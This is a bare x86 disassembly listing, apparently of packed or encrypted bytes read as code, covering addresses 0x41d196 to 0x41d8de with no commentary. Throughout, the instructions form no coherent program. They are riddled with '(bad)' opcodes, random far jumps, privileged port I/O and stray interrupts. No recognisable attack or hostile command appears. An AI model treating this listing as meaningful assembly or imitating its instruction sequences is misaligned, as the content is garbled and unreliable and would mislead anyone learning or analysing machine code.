  41d196:	leave  
  41d197:	and    DWORD PTR [edi],ebp
  41d199:	cmp    al,0xd2
  41d19b:	setns  BYTE PTR [eax]
  41d19e:	or     edx,DWORD PTR [ecx-0x36]
  41d1a1:	push   ds
  41d1a2:	push   eax
  41d1a3:	test   al,0xf
  41d1a5:	scas   eax,DWORD PTR es:[edi]
  41d1a6:	push   0x43ce6122
  41d1ab:	(bad)  
  41d1ad:	pusha  
  41d1ae:	jmp    0x41d1d4
  41d1b0:	shl    dl,cl
  41d1b2:	fld    DWORD PTR [eax-0x3164b66d]
  41d1b8:	loop   0x41d164
  41d1ba:	rcl    bl,cl
  41d1bc:	cmp    eax,0x289dfdcf
  41d1c1:	xlat   BYTE PTR ds:[ebx]
  41d1c2:	retf   0x13e8
  41d1c5:	push   eax
  41d1c6:	fld    DWORD PTR es:[esi+0x57]
  41d1ca:	jge    0x41d1c7
  41d1cc:	mov    esp,0xca6cb612
  41d1d1:	loop   0x41d1d4
  41d1d3:	(bad)  
  41d1d4:	xor    DWORD PTR [edi+0x36141620],ebx
  41d1da:	add    bh,BYTE PTR [ebx-0x7f]
  41d1dd:	out    0xa3,al
  41d1df:	add    BYTE PTR ds:0xe945c5e9,dh
  41d1e5:	int    0x34
  41d1e7:	mov    cl,bh
  41d1e9:	jne    0x41d1d6
  41d1eb:	test   eax,0xb9cdd459
  41d1f0:	add    eax,0x2f699b18
  41d1f5:	nop
  41d1f6:	xor    cl,dh
  41d1f8:	mov    gs,WORD PTR [edi+0xe7c9c56]
  41d1fe:	out    0x8b,al
  41d200:	ss std 
  41d202:	dec    edi
  41d203:	ins    DWORD PTR es:[edi],dx
  41d204:	inc    eax
  41d205:	inc    ecx
  41d206:	push   esp
  41d207:	dec    ebp
  41d208:	dec    esi
  41d209:	int3   
  41d20a:	cmp    DWORD PTR [esi],0xc
  41d20d:	arpl   WORD PTR ds:0x627d9824,di
  41d213:	inc    edx
  41d214:	repnz xchg ebx,eax
  41d216:	cmp    eax,0xb67f9c66
  41d21b:	lahf   
  41d21c:	xchg   edi,eax
  41d21d:	fild   QWORD PTR fs:[edx+0x54]
  41d221:	jae    0x41d22a
  41d223:	xor    al,0xce
  41d225:	ret    0x6cec
  41d228:	mov    ch,0x78
  41d22a:	mov    ah,0x63
  41d22c:	xchg   edx,eax
  41d22d:	jge    0x41d233
  41d22f:	pop    ecx
  41d230:	outs   dx,BYTE PTR ds:[esi]
  41d231:	jle    0x41d296
  41d233:	sub    DWORD PTR ds:0xf4254160,edx
  41d239:	test   al,0x7e
  41d23b:	add    DWORD PTR [eax],edx
  41d23d:	mov    bl,0x3d
  41d23f:	(bad)  
  41d240:	mov    bl,0x97
  41d242:	es out 0xc6,al
  41d245:	and    DWORD PTR [ebx],edx
  41d247:	js     0x41d218
  41d249:	mov    edi,0xfc69e24c
  41d24e:	cld    
  41d24f:	jbe    0x41d226
  41d251:	das    
  41d252:	jns    0x41d22a
  41d254:	lahf   
  41d255:	ins    DWORD PTR es:[edi],dx
  41d256:	add    cl,BYTE PTR [edx-0x4e64af29]
  41d25c:	add    edx,edx
  41d25e:	dec    si
  41d260:	mul    edi
  41d262:	jmp    0x41d26e
  41d264:	pop    esi
  41d265:	pop    ds
  41d266:	jae    0x41d23a
  41d268:	repz fisttp WORD PTR [ebx]
  41d26b:	mov    edi,0xf2458222
  41d270:	cmp    edi,DWORD PTR [eax-0x38269b21]
  41d276:	jmp    0xc435:0x9aee8a9a
  41d27d:	and    eax,0x452cdabc
  41d282:	mov    dl,ch
  41d284:	sbb    BYTE PTR [ecx+0xe6f66c1],dh
  41d28a:	stos   DWORD PTR es:[edi],eax
  41d28b:	idiv   BYTE PTR [eax]
  41d28d:	mov    BYTE PTR cs:[ebx-0x30],cl
  41d291:	xchg   edx,eax
  41d292:	jne    0x41d2d3
  41d294:	push   ecx
  41d295:	pushf  
  41d296:	pushf  
  41d297:	inc    esp
  41d298:	add    al,0xbe
  41d29a:	pop    cx
  41d29c:	mul    eax
  41d29e:	dec    esi
  41d29f:	out    0x52,eax
  41d2a1:	in     eax,0x23
  41d2a3:	xor    DWORD PTR [eax+0x36],ebp
  41d2a6:	call   FWORD PTR [ecx]
  41d2a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2aa:	(bad)  
  41d2ab:	mov    dh,0x62
  41d2ad:	stos   DWORD PTR es:[edi],eax
  41d2ae:	pop    ds
  41d2af:	inc    ebp
  41d2b0:	pop    esp
  41d2b1:	cmp    DWORD PTR [ecx+eiz*8-0x78ea01f7],ecx
  41d2b8:	das    
  41d2b9:	test   DWORD PTR [eax-0x770ab38f],ecx
  41d2bf:	xor    bh,al
  41d2c1:	pop    esi
  41d2c2:	rcl    DWORD PTR [ebx],0x1f
  41d2c5:	mov    ds:0xd049d96b,eax
  41d2ca:	cld    
  41d2cb:	mov    cl,0xce
  41d2cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2ce:	sbb    dl,al
  41d2d0:	and    ecx,DWORD PTR [ebx-0x465456d3]
  41d2d6:	push   0x40
  41d2d8:	enter  0xff18,0xaf
  41d2dc:	out    dx,eax
  41d2dd:	test   al,0xdf
  41d2df:	repz int 0x23
  41d2e2:	and    eax,0xc08149e
  41d2e7:	add    al,0x22
  41d2e9:	push   0x5e2ea4f9
  41d2ee:	fs cld 
  41d2f0:	stos   BYTE PTR es:[edi],al
  41d2f1:	sbb    eax,0x686e48ec
  41d2f6:	pop    edx
  41d2f7:	stos   DWORD PTR es:[edi],eax
  41d2f8:	imul   edi,DWORD PTR [ebp+esi*1-0x3b],0xe39003b5
  41d300:	inc    ecx
  41d301:	xchg   esi,eax
  41d302:	jmp    0x41d33d
  41d304:	pop    ds
  41d305:	iret   
  41d306:	popa   
  41d307:	cmp    DWORD PTR [eax+0xa],eax
  41d30a:	jle    0x41d311
  41d30c:	jns    0x41d2ed
  41d30e:	sar    DWORD PTR [ecx+0x40],1
  41d311:	fild   QWORD PTR [esi-0x551d549e]
  41d317:	fld    DWORD PTR [edi]
  41d319:	or     ecx,DWORD PTR [ebx+0x25]
  41d31c:	pop    ebx
  41d31d:	sub    edx,ebx
  41d31f:	or     dh,BYTE PTR [ebp+0x4f97e90b]
  41d325:	and    esp,esp
  41d327:	xchg   esi,eax
  41d328:	adc    ch,BYTE PTR [bx+0x23]
  41d32c:	xchg   edx,eax
  41d32d:	pusha  
  41d32e:	mov    WORD PTR [ecx+0x74f0d9c4],ds
  41d334:	stos   BYTE PTR es:[edi],al
  41d335:	adc    BYTE PTR [ecx-0x78],bh
  41d338:	loopne 0x41d329
  41d33a:	stos   BYTE PTR es:[edi],al
  41d33b:	pop    ebp
  41d33c:	lahf   
  41d33d:	repz cdq 
  41d33f:	mov    edi,0xbd3971a1
  41d344:	mov    eax,0xd827d165
  41d349:	es jp  0x41d31d
  41d34c:	fisttp WORD PTR [eax]
  41d34e:	rol    DWORD PTR [edx-0x3bb15cd9],cl
  41d354:	mov    eax,0x4874b499
  41d359:	or     eax,0xc0c2698a
  41d35e:	pop    ss
  41d35f:	sbb    BYTE PTR [ebx-0x5419b31a],0x5
  41d366:	adc    al,0x49
  41d368:	sbb    al,0xcd
  41d36a:	leave  
  41d36b:	lock scas eax,DWORD PTR es:[edi]
  41d36d:	int3   
  41d36e:	jae    0x41d347
  41d370:	repz pop ebp
  41d372:	ds add al,0xa2
  41d375:	inc    ebx
  41d376:	xor    DWORD PTR [ebp-0xc],ebp
  41d379:	mov    cl,0x48
  41d37b:	pop    ebp
  41d37c:	adc    eax,0xdc791755
  41d381:	ret    0x86cc
  41d384:	ret    0x7f5a
  41d387:	out    dx,al
  41d388:	adc    DWORD PTR [esi+0x31],0xffffffab
  41d38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d38d:	fwait
  41d38e:	xchg   DWORD PTR [edx],ebx
  41d390:	fsubr  st,st(7)
  41d392:	push   esp
  41d393:	jle    0x41d369
  41d395:	dec    eax
  41d396:	repnz leave 
  41d398:	inc    esp
  41d399:	sahf   
  41d39a:	jmp    0x3ff1b65a
  41d39f:	adc    eax,0x307cb0c3
  41d3a4:	sbb    cl,BYTE PTR [ecx+ebp*2]
  41d3a7:	pusha  
  41d3a8:	push   ecx
  41d3a9:	pop    ecx
  41d3aa:	adc    ah,BYTE PTR [edi+0x42582123]
  41d3b0:	xchg   esp,eax
  41d3b1:	push   esi
  41d3b2:	and    BYTE PTR [esi+0x69d6abe7],0x27
  41d3b9:	into   
  41d3ba:	hlt    
  41d3bb:	retf   
  41d3bc:	dec    esi
  41d3bd:	push   esp
  41d3be:	xor    BYTE PTR [edi],bh
  41d3c0:	jmp    0xa8ef:0x7c590e18
  41d3c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3c8:	xor    dl,dl
  41d3ca:	aas    
  41d3cb:	imul   eax,DWORD PTR [esi-0x7d],0x94f47b6a
  41d3d2:	arpl   WORD PTR [ecx],ax
  41d3d4:	jmp    0xa24ef35f
  41d3d9:	adc    BYTE PTR [edx],cl
  41d3db:	xchg   ebx,eax
  41d3dc:	ror    BYTE PTR [ebx+0x59],cl
  41d3df:	inc    ebp
  41d3e0:	popa   
  41d3e1:	repnz cmp BYTE PTR [edi],cl
  41d3e4:	cld    
  41d3e5:	sbb    eax,0xb3fc7482
  41d3ea:	das    
  41d3eb:	xchg   edi,eax
  41d3ec:	imul   ebx,DWORD PTR [ebp-0x7],0xb
  41d3f0:	xchg   ecx,eax
  41d3f1:	and    cl,BYTE PTR [ebp+0x223f3859]
  41d3f7:	and    BYTE PTR [ebx],0x3a
  41d3fa:	imul   edx,DWORD PTR [esi],0x62
  41d3fd:	pop    ebx
  41d3fe:	movq   QWORD PTR [ebp-0x79e0ba28],mm4
  41d405:	push   esi
  41d406:	dec    edi
  41d407:	sbb    edx,esp
  41d409:	push   0x21764097
  41d40e:	enter  0x4eed,0x3
  41d412:	dec    eax
  41d413:	bound  esp,QWORD PTR [ecx]
  41d415:	mov    eax,ds:0x42e18c0b
  41d41a:	mov    BYTE PTR [eax],bh
  41d41c:	pop    ds
  41d41d:	mov    WORD PTR fs:[esi+0x4f],ss
  41d421:	lds    ebx,FWORD PTR [eax+0x66]
  41d424:	call   0x3a185690
  41d429:	es pop ds
  41d42b:	hlt    
  41d42c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d42d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d42e:	pusha  
  41d42f:	das    
  41d430:	mov    esp,0xaaa3f71e
  41d435:	test   BYTE PTR [ecx+0x59],bl
  41d438:	xor    DWORD PTR [edx],ecx
  41d43a:	fst    QWORD PTR [edx-0x102022b7]
  41d440:	(bad)  
  41d441:	sbb    ah,BYTE PTR [esi-0x46a0ff6]
  41d447:	int3   
  41d448:	mov    gs,WORD PTR [ecx]
  41d44a:	or     ah,al
  41d44c:	stos   DWORD PTR es:[edi],eax
  41d44d:	inc    esp
  41d44e:	ins    DWORD PTR es:[edi],dx
  41d44f:	(bad)  [ebp+0x78a5ac66]
  41d455:	call   0x5a39:0x96b31a6
  41d45c:	(bad)  [ecx-0x76]
  41d45f:	lea    ebx,[edi-0x49]
  41d462:	sub    ebp,DWORD PTR [ebx-0x155c1f11]
  41d468:	mov    eax,0xd1ec74c7
  41d46d:	dec    esi
  41d46e:	loop   0x41d48d
  41d470:	jnp    0x41d4ea
  41d472:	mov    esi,0xfcca4e02
  41d477:	lds    ecx,FWORD PTR [eax]
  41d479:	push   edx
  41d47a:	push   es
  41d47b:	xchg   edi,eax
  41d47c:	inc    ecx
  41d47d:	scas   al,BYTE PTR es:[edi]
  41d47e:	and    al,0x15
  41d480:	std    
  41d481:	mov    ebx,0x10f59a39
  41d486:	repnz in al,dx
  41d488:	int3   
  41d489:	(bad)  
  41d48b:	cli    
  41d48c:	dec    ecx
  41d48d:	fimul  WORD PTR [ebx]
  41d48f:	enter  0x2101,0x26
  41d493:	js     0x41d50f
  41d495:	mov    WORD PTR ds:0xb8c4f178,?
  41d49b:	fst    QWORD PTR [eax-0x23]
  41d49e:	push   esp
  41d49f:	inc    esp
  41d4a0:	jno    0x41d499
  41d4a2:	jno    0x41d444
  41d4a4:	arpl   WORD PTR [ebp-0x14],sp
  41d4a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4a8:	adc    ch,BYTE PTR [edx]
  41d4aa:	or     bl,BYTE PTR [ebp+0x29a9c176]
  41d4b0:	in     al,dx
  41d4b1:	add    cl,BYTE PTR [ebx-0x68]
  41d4b4:	sub    eax,0x78293513
  41d4b9:	xor    edx,esi
  41d4bb:	stc    
  41d4bc:	adc    dl,BYTE PTR [esi-0x6b416cf9]
  41d4c2:	es dec edx
  41d4c4:	cmp    eax,0x7442065c
  41d4c9:	repz fbstp TBYTE PTR [ebx-0x36076e13]
  41d4d0:	outs   dx,BYTE PTR ds:[esi]
  41d4d1:	leave  
  41d4d2:	sub    eax,0xf31d5cbf
  41d4d7:	addr16 mov bh,0x5b
  41d4da:	mov    cl,0xdc
  41d4dc:	jmp    0x949f176e
  41d4e1:	jecxz  0x41d49c
  41d4e3:	lea    edi,[edx-0x67]
  41d4e6:	adc    DWORD PTR [edi],esp
  41d4e8:	std    
  41d4e9:	lahf   
  41d4ea:	fld    TBYTE PTR [ebp-0x46]
  41d4ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4ee:	ficomp DWORD PTR [edi-0x13055353]
  41d4f4:	addr16 mov esi,0xc1b3eebc
  41d4fa:	jne    0x41d56e
  41d4fc:	dec    ebx
  41d4fd:	mov    ?,WORD PTR [ecx+0x28]
  41d500:	lods   al,BYTE PTR ds:[esi]
  41d501:	test   eax,0xd7540fb1
  41d506:	test   BYTE PTR [esi-0x6b],dl
  41d509:	sti    
  41d50a:	int3   
  41d50b:	scas   al,BYTE PTR es:[edi]
  41d50c:	dec    ebp
  41d50d:	cli    
  41d50e:	in     al,0x2f
  41d510:	pop    ecx
  41d511:	out    dx,eax
  41d512:	jmp    0x41d55b
  41d514:	jb     0x41d4b1
  41d516:	dec    eax
  41d517:	and    al,0xc4
  41d519:	or     al,0x60
  41d51b:	ret    0x7f64
  41d51e:	mov    bl,0xbe
  41d520:	and    DWORD PTR [ebp-0x4d],0x149c2b3e
  41d527:	stos   BYTE PTR es:[edi],al
  41d528:	dec    esi
  41d529:	sub    ah,BYTE PTR [ebp+edx*2+0x6]
  41d52d:	das    
  41d52e:	es push 0x76
  41d531:	sub    DWORD PTR [esi+0x18617eb],edx
  41d537:	mov    ah,0x21
  41d539:	scas   eax,DWORD PTR es:[edi]
  41d53a:	inc    ecx
  41d53b:	jge    0x41d4cb
  41d53d:	ds or  esp,DWORD PTR gs:[eax]
  41d541:	gs in  al,0xff
  41d544:	add    eax,0x382f0879
  41d549:	and    eax,0x712161ad
  41d54e:	idiv   DWORD PTR [edi-0x50]
  41d551:	mov    eax,eax
  41d553:	es mov esp,eax
  41d556:	lods   al,BYTE PTR ds:[esi]
  41d557:	cmp    bl,BYTE PTR [edx]
  41d559:	dec    edx
  41d55a:	or     BYTE PTR [edi-0x781d4eb4],al
  41d560:	sbb    BYTE PTR [esi-0x5a9c19a2],dl
  41d566:	mov    al,ds:0x22156704
  41d56b:	aaa    
  41d56c:	inc    ebx
  41d56d:	push   eax
  41d56e:	jmp    0x41d570
  41d570:	pop    eax
  41d571:	mov    cl,0xc8
  41d573:	dec    eax
  41d574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d575:	daa    
  41d576:	mov    cl,0xaf
  41d578:	es cli 
  41d57a:	or     eax,0x13617d27
  41d57f:	push   0xfffffffa
  41d581:	sbb    edx,DWORD PTR [esp+esi*8-0x7dc62f3a]
  41d588:	je     0x41d599
  41d58a:	lods   eax,DWORD PTR ds:[esi]
  41d58b:	push   eax
  41d58c:	push   ebx
  41d58d:	repz mov ecx,0x16f71346
  41d593:	and    al,ch
  41d595:	cmp    eax,0x6ccf4ca9
  41d59a:	sbb    esi,0x55
  41d59d:	ins    BYTE PTR es:[edi],dx
  41d59e:	clc    
  41d59f:	das    
  41d5a0:	popa   
  41d5a1:	in     al,dx
  41d5a2:	ja     0x41d5e4
  41d5a4:	inc    ecx
  41d5a5:	aas    
  41d5a6:	adc    DWORD PTR es:[edx],ebp
  41d5a9:	pop    eax
  41d5aa:	ds mov edi,0x12440678
  41d5b0:	fiadd  DWORD PTR [edi]
  41d5b2:	add    edi,DWORD PTR [eax]
  41d5b4:	xchg   edx,eax
  41d5b5:	xchg   esp,eax
  41d5b6:	bound  edx,QWORD PTR [ecx+eax*4-0x10]
  41d5ba:	mov    cl,0xa9
  41d5bc:	lock add al,0x2f
  41d5bf:	push   es
  41d5c0:	test   BYTE PTR [esp+ebp*4+0x6a],0xa2
  41d5c5:	cmp    DWORD PTR [edi],edi
  41d5c7:	xor    ecx,ebp
  41d5c9:	fs push edi
  41d5cb:	iret   
  41d5cc:	pop    edi
  41d5cd:	adc    dh,bl
  41d5cf:	inc    ecx
  41d5d0:	xchg   BYTE PTR [esi],bl
  41d5d2:	mov    ecx,0x6362b383
  41d5d7:	in     eax,dx
  41d5d8:	jl     0x41d57d
  41d5da:	jns    0x41d62e
  41d5dc:	(bad)
  41d5df:	nop
  41d5e0:	iret   
  41d5e1:	(bad)  
  41d5e2:	mov    al,ds:0xf9315d82
  41d5e7:	rcl    DWORD PTR [esi+0x6a],1
  41d5ea:	out    0x93,al
  41d5ec:	popf   
  41d5ed:	mov    eax,ds:0x8c88a46a
  41d5f2:	rol    DWORD PTR [esi-0x5e886fd6],1
  41d5f8:	dec    eax
  41d5f9:	mov    bh,0x5
  41d5fb:	test   DWORD PTR [esi+0x7],edi
  41d5fe:	int3   
  41d5ff:	cdq    
  41d600:	xchg   BYTE PTR [edi],ah
  41d602:	dec    esp
  41d603:	sub    al,0x35
  41d605:	push   ecx
  41d606:	rcr    eax,0x1b
  41d609:	gs (bad) 
  41d60b:	int3   
  41d60c:	jae    0x41d5e9
  41d60e:	test   al,0xd2
  41d610:	mov    ebx,0x3741d9a2
  41d615:	jmp    0xa1c4:0xc8a0010c
  41d61c:	retf   
  41d61d:	or     eax,0xc9f2853e
  41d622:	inc    esi
  41d623:	adc    edi,DWORD PTR [esi-0x40]
  41d626:	aaa    
  41d627:	or     al,BYTE PTR [edi]
  41d629:	mov    dh,0xfa
  41d62b:	mov    ecx,0xf802600d
  41d630:	sar    ebx,1
  41d632:	dec    eax
  41d633:	mov    bh,BYTE PTR [esi+0x49]
  41d636:	mov    es:0x15dfe4de,eax
  41d63c:	mov    ah,0x35
  41d63e:	(bad)  
  41d63f:	aam    0xc6
  41d641:	push   ecx
  41d642:	popf   
  41d643:	push   ecx
  41d644:	imul   eax,DWORD PTR [ebx],0xa5d41e39
  41d64a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d64b:	cmc    
  41d64c:	repnz xor BYTE PTR [esi],bh
  41d64f:	dec    esp
  41d650:	sbb    eax,0x329d8706
  41d655:	out    dx,al
  41d656:	fcomp  st(0)
  41d658:	mov    ch,BYTE PTR [esp+ebp*2]
  41d65b:	cmc    
  41d65c:	pop    esp
  41d65d:	sub    al,0x34
  41d65f:	mov    al,ds:0x5ddc3432
  41d664:	into   
  41d665:	loopne 0x41d67b
  41d667:	in     al,dx
  41d668:	push   ebp
  41d669:	mov    BYTE PTR [ebx],0x9a
  41d66c:	cmp    al,BYTE PTR [ebx+0x78]
  41d66f:	neg    DWORD PTR [ebx-0x89d0c19]
  41d675:	push   ebx
  41d676:	pop    ebp
  41d677:	push   edx
  41d678:	jmp    0xf93c:0x117de952
  41d67f:	jae    0x41d683
  41d681:	mov    bl,0xac
  41d683:	pusha  
  41d684:	adc    esp,ecx
  41d686:	or     al,0x9d
  41d688:	and    BYTE PTR [edx+0x4a],bh
  41d68b:	ret    0x8f2a
  41d68e:	cwde   
  41d68f:	popa   
  41d690:	test   BYTE PTR [ebx+0x17],0x92
  41d694:	outs   dx,BYTE PTR ds:[esi]
  41d695:	push   ecx
  41d696:	gs lods eax,DWORD PTR ds:[esi]
  41d699:	rcl    BYTE PTR [esi-0x6c45355b],1
  41d69f:	loope  0x41d6a3
  41d6a1:	cdq    
  41d6a2:	dec    ebp
  41d6a3:	pop    ebx
  41d6a4:	int3   
  41d6a5:	loopne 0x41d717
  41d6a7:	sub    ebx,ebp
  41d6a9:	pop    edi
  41d6aa:	jl     0x41d656
  41d6ac:	mov    edx,0x69a752c1
  41d6b1:	add    al,0x37
  41d6b3:	add    BYTE PTR [edi+0x7c70d776],ch
  41d6b9:	sub    DWORD PTR [esi-0x31],eax
  41d6bc:	dec    esp
  41d6bd:	fwait
  41d6be:	neg    bl
  41d6c0:	enter  0xa835,0x4e
  41d6c4:	or     al,0xb0
  41d6c6:	push   ds
  41d6c7:	hlt    
  41d6c8:	jl     0x41d749
  41d6ca:	jmp    0x117:0x360b12a2
  41d6d1:	cmp    eax,0x8cf44bcc
  41d6d6:	add    BYTE PTR [ecx],al
  41d6d8:	enter  0x91da,0x31
  41d6dc:	sbb    BYTE PTR [ecx],al
  41d6de:	push   0xac7b194c
  41d6e3:	add    al,0x77
  41d6e5:	fdivr  QWORD PTR [ebx]
  41d6e7:	jg     0x41d713
  41d6e9:	cmc    
  41d6ea:	inc    esi
  41d6eb:	xchg   ebx,eax
  41d6ec:	pop    esi
  41d6ed:	int    0x70
  41d6ef:	push   eax
  41d6f0:	daa    
  41d6f1:	sub    esp,esi
  41d6f3:	pmulhuw mm7,QWORD PTR [ebx]
  41d6f6:	pop    ds
  41d6f7:	inc    esp
  41d6f8:	xor    edi,esp
  41d6fa:	aas    
  41d6fb:	lea    ebx,ds:0xb56851f0
  41d701:	inc    esp
  41d702:	sbb    al,0x5c
  41d704:	sbb    DWORD PTR [edx],esp
  41d706:	dec    esp
  41d707:	sbb    BYTE PTR ds:0x98b7599e,0xcd
  41d70e:	rol    DWORD PTR [esi-0x24],0x75
  41d712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d713:	sbb    BYTE PTR [edx-0x5fecf93e],ah
  41d719:	in     al,dx
  41d71a:	stos   DWORD PTR es:[edi],eax
  41d71b:	jo     0x41d71b
  41d71d:	call   FWORD PTR [esi+0x700d8d07]
  41d723:	sub    DWORD PTR [edi+ebx*2],eax
  41d726:	mov    eax,ds:0x43f38f41
  41d72b:	or     ah,dh
  41d72d:	inc    ebx
  41d72e:	cmp    bh,BYTE PTR [edx+edx*1]
  41d731:	leave  
  41d732:	mov    edi,DWORD PTR [ebx]
  41d734:	xchg   edi,eax
  41d735:	pop    es
  41d736:	add    DWORD PTR [eax-0x38],ebp
  41d739:	adc    eax,DWORD PTR [esi]
  41d73b:	jp     0x41d730
  41d73d:	out    0xae,eax
  41d73f:	addr16 mov ch,0xa2
  41d742:	test   eax,0xac820295
  41d747:	xchg   edx,eax
  41d748:	and    dh,cl
  41d74a:	fbstp  TBYTE PTR [edx+0x2211ce9a]
  41d750:	xchg   DWORD PTR [ecx+0x15a4236],edi
  41d756:	test   al,0xa
  41d758:	call   0x8d29f541
  41d75d:	sub    DWORD PTR [edx],0x67
  41d760:	sar    BYTE PTR [ebx+eax*1],1
  41d763:	lods   al,BYTE PTR ds:[esi]
  41d765:	pop    ecx
  41d766:	mov    al,0x99
  41d768:	or     eax,0xc1bbca64
  41d76d:	xor    ebp,DWORD PTR [ecx]
  41d76f:	jmp    0x41d73b
  41d771:	adc    eax,0x19367a56
  41d776:	jns    0x41d7b1
  41d778:	popf   
  41d779:	mov    dh,0x8e
  41d77b:	rcr    BYTE PTR [eax],0x51
  41d77e:	sbb    BYTE PTR [edx],bl
  41d780:	sub    eax,0x38c20105
  41d785:	adc    eax,0x852c0b88
  41d78a:	bound  esp,QWORD PTR [edi]
  41d78c:	pop    esi
  41d78d:	test   dh,ch
  41d78f:	repz jo 0x41d714
  41d792:	pushf  
  41d793:	add    DWORD PTR [ebx+0x50],esi
  41d796:	sub    al,0xc2
  41d798:	and    eax,0x72daf6bc
  41d79d:	cmp    bl,BYTE PTR [esi+0x3b97601e]
  41d7a3:	shr    DWORD PTR [eax+edx*1],1
  41d7a6:	sub    BYTE PTR [eax-0x422d9198],0xad
  41d7ad:	ss mov ah,0x54
  41d7b0:	cdq    
  41d7b1:	and    bl,ch
  41d7b3:	sbb    ecx,eax
  41d7b5:	dec    eax
  41d7b6:	lods   eax,DWORD PTR ds:[esi]
  41d7b7:	mov    ch,0xd
  41d7b9:	je     0x41d7ea
  41d7bb:	cmp    cl,bl
  41d7bd:	js     0x41d763
  41d7bf:	sahf   
  41d7c0:	ds jge 0x41d803
  41d7c3:	inc    eax
  41d7c4:	xchg   ebx,eax
  41d7c5:	xchg   ecx,eax
  41d7c6:	mov    WORD PTR [edi-0x49bf5dc],cs
  41d7cc:	jno    0x41d847
  41d7ce:	shl    BYTE PTR [edi-0x77],cl
  41d7d1:	cmp    ecx,ebp
  41d7d3:	cmp    edi,DWORD PTR [edi-0x2b]
  41d7d6:	bound  eax,QWORD PTR [ebx]
  41d7d8:	pop    esp
  41d7d9:	mov    ebp,0x524f99cc
  41d7de:	push   edi
  41d7df:	sbb    DWORD PTR [edx-0x4e],ecx
  41d7e2:	test   BYTE PTR [ebp+0x27],al
  41d7e5:	ins    BYTE PTR es:[edi],dx
  41d7e6:	mov    ebp,cs
  41d7e8:	rcl    DWORD PTR [eax+0x1],0x1f
  41d7ec:	dec    esi
  41d7ed:	push   eax
  41d7ee:	scas   eax,DWORD PTR es:[edi]
  41d7ef:	pop    edi
  41d7f0:	inc    esi
  41d7f1:	cld    
  41d7f2:	gs xchg al,al
  41d7f5:	ret    0x9516
  41d7f8:	adc    bh,BYTE PTR [edx]
  41d7fa:	ins    DWORD PTR es:[edi],dx
  41d7fb:	and    dh,BYTE PTR [eax+0x17c70e]
  41d801:	adc    DWORD PTR [edi-0x73],esi
  41d804:	cmc    
  41d805:	cli    
  41d806:	je     0x41d83e
  41d808:	bound  esp,QWORD PTR [ebx+0x186c6590]
  41d80e:	inc    ebx
  41d80f:	add    DWORD PTR [edi],edx
  41d811:	sbb    DWORD PTR [esi-0x3a],0xffffffd2
  41d815:	inc    esi
  41d816:	rcr    BYTE PTR [ecx],1
  41d818:	pop    ebp
  41d819:	dec    edx
  41d81a:	sbb    BYTE PTR [esi+0x71586f52],ch
  41d820:	inc    ecx
  41d821:	xchg   bl,cl
  41d823:	sub    dl,BYTE PTR [eax-0x78c7b118]
  41d829:	std    
  41d82a:	pop    esi
  41d82b:	out    dx,al
  41d82c:	(bad)  
  41d82d:	jbe    0x41d7c5
  41d82f:	jg     0x41d837
  41d831:	lods   al,BYTE PTR ds:[esi]
  41d832:	aas    
  41d833:	add    al,0x7
  41d835:	push   eax
  41d836:	dec    ebx
  41d837:	xor    BYTE PTR [edx+0x635d43a7],0x63
  41d83e:	(bad)  
  41d83f:	in     eax,dx
  41d840:	xchg   ebp,eax
  41d841:	or     ah,dl
  41d843:	(bad)
  41d846:	dec    esp
  41d847:	shl    BYTE PTR [edx-0x43],0x19
  41d84b:	inc    eax
  41d84c:	push   0xffffff99
  41d84e:	rol    BYTE PTR [esi],cl
  41d850:	retf   
  41d851:	cmp    esp,DWORD PTR [eax]
  41d853:	push   esi
  41d854:	mov    bh,0xdb
  41d856:	push   edi
  41d857:	test   al,0x94
  41d859:	test   al,0x18
  41d85b:	in     eax,0x66
  41d85d:	xchg   esi,eax
  41d85e:	jns    0x41d8be
  41d860:	aam    0x7f
  41d862:	je     0x41d85b
  41d864:	adc    ebp,DWORD PTR [eax-0x7b]
  41d867:	sub    al,0x38
  41d869:	stc    
  41d86a:	ret    
  41d86b:	and    BYTE PTR [ebx],ah
  41d86d:	(bad)  
  41d86e:	xchg   esp,eax
  41d86f:	mov    eax,0xbd8068c2
  41d874:	into   
  41d875:	fs aad 0xa2
  41d878:	dec    edi
  41d879:	loope  0x41d8f3
  41d87b:	push   0x9
  41d87d:	sbb    esi,eax
  41d87f:	lahf   
  41d880:	xlat   BYTE PTR cs:[ebx]
  41d882:	inc    ebx
  41d883:	xchg   BYTE PTR [ebp-0x33971d33],dh
  41d889:	ins    DWORD PTR es:[edi],dx
  41d88a:	or     DWORD PTR [esp+eax*4],esi
  41d88d:	(bad)  
  41d890:	mov    ebp,0x309bb16
  41d895:	mov    ds,WORD PTR [ebx]
  41d897:	pop    esp
  41d898:	and    ch,dl
  41d89a:	mov    edi,0xf66d1350
  41d89f:	sti    
  41d8a0:	retf   0x62ed
  41d8a3:	sbb    BYTE PTR [esi+0x7a],dh
  41d8a6:	add    eax,0x5f615ce1
  41d8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8ac:	icebp  
  41d8ad:	pop    edx
  41d8ae:	(bad)  
  41d8af:	push   edi
  41d8b0:	adc    dh,BYTE PTR [ebp-0x7049fd2f]
  41d8b6:	jnp    0x41d8c8
  41d8b8:	pop    esp
  41d8b9:	add    dh,dl
  41d8bb:	and    BYTE PTR cs:[edi+0x23db5cf0],bh
  41d8c2:	aam    0x97
  41d8c4:	and    DWORD PTR [ebx],ebp
  41d8c6:	push   ebp
  41d8c7:	stc    
  41d8c8:	xchg   edi,eax
  41d8c9:	mov    bl,0x3b
  41d8cb:	(bad)  
  41d8cc:	nop
  41d8cd:	sar    edx,0x74
  41d8d0:	mov    ds:0x67bed5b9,eax
  41d8d5:	push   cs
  41d8d6:	fild   DWORD PTR cs:[ecx+0x9391161]
  41d8dd:	outs   dx,BYTE PTR ds:[esi]
  41d8de:	pop    es
